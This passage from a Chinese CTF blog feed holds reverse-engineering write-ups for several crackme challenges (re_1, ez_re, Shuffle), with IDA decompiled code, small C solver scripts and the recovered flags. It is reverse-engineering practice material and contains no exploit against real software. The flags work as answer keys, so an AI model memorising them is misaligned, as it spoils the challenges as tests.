90</span><br><span class="line">233372  62 66 17 38 19 83 12 98 61 57 63 67 69 10 24 75 60 87 76 37 91 35 20 30 24 77 29 </span><br><span class="line">27 40 36 98 82 20 67 45 96 99 80 17 55 74 55</span><br><span class="line">251643  64 68 36 79 23 96 16 40 79 16 85 77 99 56 95 99 60 28 11 96 22 66 47 66 90 48 80 </span><br><span class="line">34 22 47 66 80 37 43 75 84 23 21 39 85 64 95</span><br><span class="line">245051  14 55 61 90 62 91 24 31 40 34 88 59 65 26 16 28 36 33 81 91 99 57 69 75 32 98 17 </span><br><span class="line">60 94 16 89 51 35 74 87 98 52 39 73 41 65 65</span><br><span class="line">228339  58 64 96 49 96 43 13 28 42 90 80 33 68 62 42 78 75 56 20 66 45 63 10 72 41 63 28 </span><br><span class="line">42 60 26 76 20 98 19 51 68 80 12 48 68 80 15</span><br><span class="line">271672  93 74 76 39 79 99 22 66 47 40 85 58 50 56 84 93 65 65 56 66 95 32 84 48 51 68 30 </span><br><span class="line">96 93 60 83 79 54 61 99 77 12 51 31 93 54 12</span><br><span class="line">207826  30 29 52 29 91 81 31 28 75 84 10 40 14 34 26 70 94 74 27 38 55 13 21 55 79 94 45 </span><br><span class="line">41 39 62 56 25 10 54 61 58 23 97 95 70 18 62</span><br><span class="line">208076  19 60 27 79 53 21 21 47 52 26 42 82 20 87 74 57 88 22 67 95 69 24 50 14 31 26 38 </span><br><span class="line">40 31 46 17 67 85 54 33 46 43 72 84 94 67 29</span><br><span class="line">230168  37 52 47 30 99 11 20 20 41 72 46 78 97 93 47 73 48 35 85 99 77 49 48 75 94 44 29 </span><br><span class="line">11 18 71 82 88 27 70 95 26 19 73 61 51 55 51</span><br><span class="line">195444  92 21 36 77 36 27 25 45 48 16 73 90 71 53 47 39 75 33 96 11 22 18 15 48 20 16 90 </span><br><span class="line">50 66 11 49 91 23 60 81 53 57 18 19 40 54 48</span><br><span class="line">233025  47 22 61 36 88 58 42 13 69 33 89 93 93 75 31 98 65 94 77 16 14 99 21 89 90 37 27 </span><br><span class="line">11 22 80 66 65 31 70 76 29 49 92 51 38 27 47</span><br><span class="line">224202  69 33 97 97 51 59 15 17 92 59 84 19 33 54 78 15 50 28 40 68 75 23 55 38 69 46 21 </span><br><span class="line">39 36 74 84 90 31 57 81 21 46 66 63 23 43 82</span><br><span class="line">246170  26 52 48 41 14 64 11 31 90 49 93 92 45 56 99 85 81 26 34 27 55 55 85 26 41 83 41 </span><br><span class="line">46 89 41 66 96 92 16 47 73 59 85 57 88 70 49</span><br><span class="line">223337  26 74 51 31 10 55 23 33 62 97 93 71 96 89 28 35 63 26 66 12 83 67 39 72 92 78 70 </span><br><span class="line">19 63 76 74 70 84 31 18 22 54 74 32 30 65 15</span><br><span class="line">244180  88 20 28 71 54 74 73 90 12 35 49 94 69 20 18 88 80 88 73 65 19 40 23 17 21 48 71 </span><br><span class="line">89 96 61 92 81 74 36 78 16 81 39 43 12 80 91</span><br><span class="line">241027  30 64 16 36 85 58 43 97 90 85 79 28 28 86 24 40 43 22 95 74 73 29 35 13 82 67 77 </span><br><span class="line">76 19 70 29 61 92 51 82 98 40 83 72 33 81 41</span><br><span class="line">225646  55 16 69 49 35 88 71 14 64 16 23 34 81 89 66 79 20 40 11 10 52 74 55 26 64 30 97 </span><br><span class="line">65 51 88 55 59 20 18 97 86 65 28 44 71 64 93</span><br><span class="line">217174  48 91 36 87 35 11 40 67 90 25 39 85 29 97 57 44 99 88 34 83 75 10 73 63 44 63 56 </span><br><span class="line">17 94 16 28 78 55 63 19 22 37 36 42 16 49 51</span><br><span class="line">222271  51 55 27 49 54 89 77 58 15 36 25 43 71 57 78 55 54 58 28 79 87 92 39 88 61 11 27 </span><br><span class="line">66 59 96 79 75 69 25 16 40 68 30 16 12 51 48</span><br><span class="line">203973  71 29 57 59 30 75 67 39 95 14 48 49 35 93 56 94 14 59 12 49 19 40 16 86 79 38 31 </span><br><span class="line">43 82 14 51 85 85 19 99 35 30 19 26 15 32 77</span><br></pre></td></tr></table></figure><p>最终结果转换成字符串即可。</p><blockquote><p>flag{nO_w@y_y0u_woRk_ou7_mY_equ4tions_5et}</p></blockquote><h1 id="re-1"><a href="#re-1" class="headerlink" title="re_1"></a>re_1</h1><p><a href="https://pan.baidu.com/s/1VidIkvouV3V1GUSc79yMFQ">附件链接</a> 提取码：0000<br>ida64打开，进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void **v3; &#x2F;&#x2F; rdx</span><br><span class="line">  void *v5; &#x2F;&#x2F; [rsp+40h] [rbp-330h]</span><br><span class="line">  void *v6; &#x2F;&#x2F; [rsp+48h] [rbp-328h]</span><br><span class="line">  void *v7; &#x2F;&#x2F; [rsp+50h] [rbp-320h]</span><br><span class="line">  void *v8; &#x2F;&#x2F; [rsp+58h] [rbp-318h]</span><br><span class="line">  void *v9; &#x2F;&#x2F; [rsp+60h] [rbp-310h]</span><br><span class="line">  void *v10; &#x2F;&#x2F; [rsp+68h] [rbp-308h]</span><br><span class="line">  void *v11; &#x2F;&#x2F; [rsp+70h] [rbp-300h]</span><br><span class="line">  void *v12; &#x2F;&#x2F; [rsp+78h] [rbp-2F8h]</span><br><span class="line">  void *v13; &#x2F;&#x2F; [rsp+80h] [rbp-2F0h]</span><br><span class="line">  void *v14; &#x2F;&#x2F; [rsp+88h] [rbp-2E8h]</span><br><span class="line">  void *v15; &#x2F;&#x2F; [rsp+90h] [rbp-2E0h]</span><br><span class="line">  void *v16; &#x2F;&#x2F; [rsp+98h] [rbp-2D8h]</span><br><span class="line">  void *v17; &#x2F;&#x2F; [rsp+A0h] [rbp-2D0h]</span><br><span class="line">  void *v18; &#x2F;&#x2F; [rsp+A8h] [rbp-2C8h]</span><br><span class="line">  void *v19; &#x2F;&#x2F; [rsp+B0h] [rbp-2C0h]</span><br><span class="line">  void *v20; &#x2F;&#x2F; [rsp+B8h] [rbp-2B8h]</span><br><span class="line">  void *v21; &#x2F;&#x2F; [rsp+C0h] [rbp-2B0h]</span><br><span class="line">  void *v22; &#x2F;&#x2F; [rsp+C8h] [rbp-2A8h]</span><br><span class="line">  void *v23; &#x2F;&#x2F; [rsp+D0h] [rbp-2A0h]</span><br><span class="line">  void *v24; &#x2F;&#x2F; [rsp+D8h] [rbp-298h]</span><br><span class="line">  void *v25; &#x2F;&#x2F; [rsp+E0h] [rbp-290h]</span><br><span class="line">  void *v26; &#x2F;&#x2F; [rsp+E8h] [rbp-288h]</span><br><span class="line">  void *v27; &#x2F;&#x2F; [rsp+F0h] [rbp-280h]</span><br><span class="line">  void *v28; &#x2F;&#x2F; [rsp+F8h] [rbp-278h]</span><br><span class="line">  void *v29; &#x2F;&#x2F; [rsp+100h] [rbp-270h]</span><br><span class="line">  void *v30; &#x2F;&#x2F; [rsp+108h] [rbp-268h]</span><br><span class="line">  void *v31; &#x2F;&#x2F; [rsp+110h] [rbp-260h]</span><br><span class="line">  void *v32; &#x2F;&#x2F; [rsp+118h] [rbp-258h]</span><br><span class="line">  void *v33; &#x2F;&#x2F; [rsp+120h] [rbp-250h]</span><br><span class="line">  void *v34; &#x2F;&#x2F; [rsp+128h] [rbp-248h]</span><br><span class="line">  void *v35; &#x2F;&#x2F; [rsp+130h] [rbp-240h]</span><br><span class="line">  void *v36; &#x2F;&#x2F; [rsp+138h] [rbp-238h]</span><br><span class="line">  void *v37; &#x2F;&#x2F; [rsp+140h] [rbp-230h]</span><br><span class="line">  void *v38; &#x2F;&#x2F; [rsp+148h] [rbp-228h]</span><br><span class="line">  void *v39; &#x2F;&#x2F; [rsp+150h] [rbp-220h]</span><br><span class="line">  void *v40; &#x2F;&#x2F; [rsp+158h] [rbp-218h]</span><br><span class="line">  void *v41; &#x2F;&#x2F; [rsp+160h] [rbp-210h]</span><br><span class="line">  void *v42; &#x2F;&#x2F; [rsp+168h] [rbp-208h]</span><br><span class="line">  void *v43; &#x2F;&#x2F; [rsp+170h] [rbp-200h]</span><br><span class="line">  void *v44; &#x2F;&#x2F; [rsp+178h] [rbp-1F8h]</span><br><span class="line">  int v45; &#x2F;&#x2F; [rsp+368h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+36Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; &amp;v5;</span><br><span class="line">  memset(&amp;v5, 0, 0x320uLL);</span><br><span class="line">  v5 &#x3D; &amp;unk_483004;</span><br><span class="line">  v6 &#x3D; &amp;unk_483007;</span><br><span class="line">  v7 &#x3D; &amp;unk_483004;</span><br><span class="line">  v8 &#x3D; &amp;unk_48300A;</span><br><span class="line">  v9 &#x3D; &amp;unk_48300D;</span><br><span class="line">  v10 &#x3D; &amp;unk_483010;</span><br><span class="line">  v11 &#x3D; &amp;unk_483013;</span><br><span class="line">  v12 &#x3D; &amp;unk_483016;</span><br><span class="line">  v13 &#x3D; &amp;unk_483019;</span><br><span class="line">  v14 &#x3D; &amp;unk_48301C;</span><br><span class="line">  v15 &#x3D; &amp;unk_48301F;</span><br><span class="line">  v16 &#x3D; &amp;unk_483022;</span><br><span class="line">  v17 &#x3D; &amp;unk_483022;</span><br><span class="line">  v18 &#x3D; &amp;unk_483022;</span><br><span class="line">  v19 &#x3D; &amp;unk_483025;</span><br><span class="line">  v20 &#x3D; &amp;unk_48300A;</span><br><span class="line">  v21 &#x3D; &amp;unk_483019;</span><br><span class="line">  v22 &#x3D; &amp;unk_483016;</span><br><span class="line">  v23 &#x3D; &amp;unk_483028;</span><br><span class="line">  v24 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v25 &#x3D; &amp;unk_483010;</span><br><span class="line">  v26 &#x3D; &amp;unk_48302E;</span><br><span class="line">  v27 &#x3D; &amp;unk_48301F;</span><br><span class="line">  v28 &#x3D; &amp;unk_483031;</span><br><span class="line">  v29 &#x3D; &amp;unk_483010;</span><br><span class="line">  v30 &#x3D; &amp;unk_483034;</span><br><span class="line">  v31 &#x3D; &amp;unk_483034;</span><br><span class="line">  v32 &#x3D; &amp;unk_483022;</span><br><span class="line">  v33 &#x3D; &amp;unk_483025;</span><br><span class="line">  v34 &#x3D; &amp;unk_483034;</span><br><span class="line">  v35 &#x3D; &amp;unk_483025;</span><br><span class="line">  v36 &#x3D; &amp;unk_48300A;</span><br><span class="line">  v37 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v38 &#x3D; &amp;unk_48302E;</span><br><span class="line">  v39 &#x3D; &amp;unk_483034;</span><br><span class="line">  v40 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v41 &#x3D; &amp;unk_48302E;</span><br><span class="line">  v42 &#x3D; &amp;unk_483037;</span><br><span class="line">  v43 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v44 &#x3D; &amp;unk_48303A;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 39; ++i )</span><br><span class="line">    v45 &#x3D; fun(*(&amp;v5 + i));</span><br><span class="line">  system(&quot;pause&quot;, argv, v3);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall fun(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-10h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [rsp+10h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+14h] [rbp-4h]</span><br><span class="line">  v2 &#x3D; 0LL;</span><br><span class="line">  for ( i &#x3D; 0; *(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(i + a1) &gt; 47 &amp;&amp; *(i + a1) &lt;&#x3D; 57 )</span><br><span class="line">      v3 &#x3D; *(i + a1) - 48;</span><br><span class="line">    if ( *(i + a1) &gt; 96 &amp;&amp; *(i + a1) &lt;&#x3D; 122 )</span><br><span class="line">      v3 &#x3D; *(i + a1) - 87;</span><br><span class="line">    if ( *(i + a1) &gt; 64 &amp;&amp; *(i + a1) &lt;&#x3D; 90 )</span><br><span class="line">      v3 &#x3D; *(i + a1) - 55;</span><br><span class="line">    v2 &#x3D; 16 * v2 + v3;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题除了有点废手就没什么了。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a[80]&#x3D;&#123;0x37,0x33,0x37,0x39,0x37,0x33,0x36,0x33,0x37,0x34,0x36,0x36,0x37,0x62,0x37,0x37,</span><br><span class="line">    0x33,0x34,0x33,0x35,0x36,0x35,0x36,0x34,0x36,0x34,0x36,0x34,0x33,0x36,0x36,0x33,0x33,0x34,</span><br><span class="line">    0x33,0x37,0x36,0x31,0x33,0x39,0x36,0x36,0x33,0x38,0x36,0x35,0x33,0x32,0x36,0x36,0x33,0x31,</span><br><span class="line">    0x33,0x31,0x36,0x34,0x33,0x36,0x33,0x31,0x33,0x36,0x36,0x33,0x33,0x39,0x33,0x38,0x33,0x31,</span><br><span class="line">    0x33,0x39,0x33,0x38,0x36,0x32,0x33,0x39,0x37,0x64&#125;;</span><br><span class="line">    int flag[80];</span><br><span class="line">    int v3,v2&#x3D;0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;80;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ( a[i] &gt; 47 &amp;&amp; a[i] &lt;&#x3D; 57 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 &#x3D; a[i] - 48;</span><br><span class="line">            a[i]&#x3D; v3;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else if ( a[i] &gt; 96 &amp;&amp; a[i] &lt;&#x3D; 122 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 &#x3D; a[i] - 87;</span><br><span class="line">            a[i]&#x3D; v3;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else if ( a[i] &gt; 64 &amp;&amp; a[i] &lt;&#x3D; 90 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 &#x3D; a[i] - 55;</span><br><span class="line">            a[i]&#x3D; v3;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            a[i]&#x3D; 0;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(int i&#x3D;0;i&lt;80;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(flag[i]!&#x3D; 0);</span><br><span class="line">        printf(&quot;%0x&quot;,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着16进制字符串。</p><blockquote><p>sysctf{w45eddd6c47a9f8e2f11d616c98198b9}</p></blockquote><h1 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h1><p><a href="https://pan.baidu.com/s/14LzmZK_3QGRU-uN9IKaetg">附件链接</a> 提取码：0000<br>拖入ida中，查看main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; rdx</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rdx</span><br><span class="line">  char v6; &#x2F;&#x2F; [rsp+0h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;You got something good for me?\n&gt;&quot;, argv, envp);</span><br><span class="line">  _isoc99_scanf(&quot;%33s&quot;);</span><br><span class="line">  if ( j_strlen_ifunc(&amp;v6, &amp;v6) &#x3D;&#x3D; 33 )</span><br><span class="line">  &#123;</span><br><span class="line">    crypto(&amp;v6);</span><br><span class="line">    printf(&quot;checking...&quot;);</span><br><span class="line">    if ( check(&amp;v6) )</span><br><span class="line">      puts(&quot;Well done,h4cker!&quot;, &amp;v6, v5);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;O0ops....&quot;, &amp;v6, v5);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;O0ops....&quot;, &amp;v6, v3);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall crypto(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; &#x2F;&#x2F; rax</span><br><span class="line">  signed int v2; &#x2F;&#x2F; [rsp+10h] [rbp-8h]</span><br><span class="line">  signed int v3; &#x2F;&#x2F; [rsp+14h] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; 55;</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  while ( v3 &lt;&#x3D; 32 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v3 + a1) -&#x3D; 2;</span><br><span class="line">    result &#x3D; (v3 + a1);</span><br><span class="line">    *result ^&#x3D; v2;</span><br><span class="line">    ++v3;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall check(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v2; &#x2F;&#x2F; [rsp+18h] [rbp-8h]</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; 1;</span><br><span class="line">  sleep(2LL);</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 32; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(i + a1) !&#x3D; byte_6D4100[i] )</span><br><span class="line">      v2 &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个异或加一个比较。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int v2 &#x3D; 55;</span><br><span class="line">    int v3 &#x3D; 0;</span><br><span class="line">    char flag[33];</span><br><span class="line">    char result[33];</span><br><span class="line">    int byte_6D4100[33]&#x3D;&#123;0x53,0x52,0x66,0x5F,0x42,0x4F,0x71,0x50,0xD,0x21,0x28,0x1F,0x6C,</span><br><span class="line">    0x35,0x18,0x26,0x79,</span><br><span class="line">    0x39,0x2E,0x2B,0x16,0x7F,0x24,0x29,0x25,0x3A,0xC,0x1F,0x37,9,0x25,0x67,0x2C&#125;;</span><br><span class="line">    int i;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 32; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] &#x3D; byte_6D4100[i];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    for ( i &#x3D; 0; i &lt;&#x3D; 32; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        result[i] &#x3D; flag[i]^v2;</span><br><span class="line">        result[i] +&#x3D; 2;</span><br><span class="line">        v2++;</span><br><span class="line">        printf(&quot;%c&quot;,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{uNp4ck_1s_b@sic_5kill_Of_r3}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界</title>
      <link href="2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h1><a id="more"></a><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4942&page=1">题目链接</a><br>ida64打开，进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s &#x3D; &#39;S&#39;;</span><br><span class="line">v11 &#x3D; &#39;E&#39;;</span><br><span class="line">v12 &#x3D; &#39;C&#39;;</span><br><span class="line">v13 &#x3D; &#39;C&#39;;</span><br><span class="line">v14 &#x3D; &#39;O&#39;;</span><br><span class="line">v15 &#x3D; &#39;N&#39;;</span><br><span class="line">v16 &#x3D; &#39;&#123;&#39;;</span><br><span class="line">v17 &#x3D; &#39;W&#39;;</span><br><span class="line">v18 &#x3D; &#39;e&#39;;</span><br><span class="line">v19 &#x3D; &#39;l&#39;;</span><br><span class="line">v20 &#x3D; &#39;c&#39;;</span><br><span class="line">v21 &#x3D; &#39;o&#39;;</span><br><span class="line">v22 &#x3D; &#39;m&#39;;</span><br><span class="line">v23 &#x3D; &#39;e&#39;;</span><br><span class="line">v24 &#x3D; &#39; &#39;;</span><br><span class="line">v25 &#x3D; &#39;t&#39;;</span><br><span class="line">v26 &#x3D; &#39;o&#39;;</span><br><span class="line">v27 &#x3D; &#39; &#39;;</span><br><span class="line">v28 &#x3D; &#39;t&#39;;</span><br><span class="line">v29 &#x3D; &#39;h&#39;;</span><br><span class="line">v30 &#x3D; &#39;e&#39;;</span><br><span class="line">v31 &#x3D; &#39; &#39;;</span><br><span class="line">v32 &#x3D; &#39;S&#39;;</span><br><span class="line">v33 &#x3D; &#39;E&#39;;</span><br><span class="line">v34 &#x3D; &#39;C&#39;;</span><br><span class="line">v35 &#x3D; &#39;C&#39;;</span><br><span class="line">v36 &#x3D; &#39;O&#39;;</span><br><span class="line">v37 &#x3D; &#39;N&#39;;</span><br><span class="line">v38 &#x3D; &#39; &#39;;</span><br><span class="line">v39 &#x3D; &#39;2&#39;;</span><br><span class="line">v40 &#x3D; &#39;0&#39;;</span><br><span class="line">v41 &#x3D; &#39;1&#39;;</span><br><span class="line">v42 &#x3D; &#39;4&#39;;</span><br><span class="line">v43 &#x3D; &#39; &#39;;</span><br><span class="line">v44 &#x3D; &#39;C&#39;;</span><br><span class="line">v45 &#x3D; &#39;T&#39;;</span><br><span class="line">v46 &#x3D; &#39;F&#39;;</span><br><span class="line">v47 &#x3D; &#39;!&#39;;</span><br><span class="line">v48 &#x3D; &#39;&#125;&#39;;</span><br></pre></td></tr></table></figure><blockquote><p>SECCON{Welcome to the SECCON 2014 CTF!}</p></blockquote><h1 id="666"><a href="#666" 